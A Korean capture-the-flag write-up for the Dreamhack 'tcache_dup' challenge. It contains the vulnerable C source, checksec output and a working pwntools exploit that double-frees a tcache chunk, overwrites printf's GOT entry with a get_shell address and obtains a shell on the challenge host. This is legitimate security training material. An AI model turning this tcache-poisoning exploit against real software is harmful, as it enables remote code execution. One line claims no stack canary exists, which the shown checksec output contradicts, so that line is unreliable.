# tcache_dup

- [문제 페이지](https://dreamhack.io/wargame/challenges/60)

## 문제 해설
```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```
문제 코드를 보면 힙 할당과 해제를 하는 코드임을 알 수 있다. 먼저 checksec을 살펴보자

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
PIE와 카나리가 존재하지 않는다. 

코드 시나리오를 작성해보면

1. Double Free Bug를 일으킨다.
2. GOT를 get_shell로 변조한다.

하지만, 프리된 청크의 key를 변조하는 코드는 존재하지 않는다. 

직접 실행을 하면

```
1. Create
2. Delete
> 1
Size: 32
Data: test
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
> 
```
Double Free를 위한 보호 기법이 걸려있지 않아 같은 청크를 두번 이상 Free시킬 수 있다.

따라서, ptr의 0번째를 할당하고, 해제를 두번, fd를 printf의 got로 설정하여 이 data를 get_shell의 주소로 변조하면 된다.

이걸 python 코드로 작성하면

```python

from pwn import *

def create(size, data):
    global p;

    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Size: ', size)
    p.sendafter(b'Data: ', data);

def delete(index):
    global p

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', index)

p = remote("host1.dreamhack.games", 13235)

create(b'64', b'test')
delete(b'0')
delete(b'0')
create(b'64', p64(0x601038))
create(b'64', p64(0x601038))

create(b'64', p64(0x400ab0))

p.interactive()
```

다음과 같이 작성되고, 이를 실행하면
```
[+] Opening connection to host1.dreamhack.games on port 13235: Done
 [*] Switching to interactive mode
1. Create
2. Delete
$ ls
flag
tcache_dup
$ cat flag
DH{********************************************}
$  
```
잘 실행됨을 확인할 수 있다.

![success](image.png)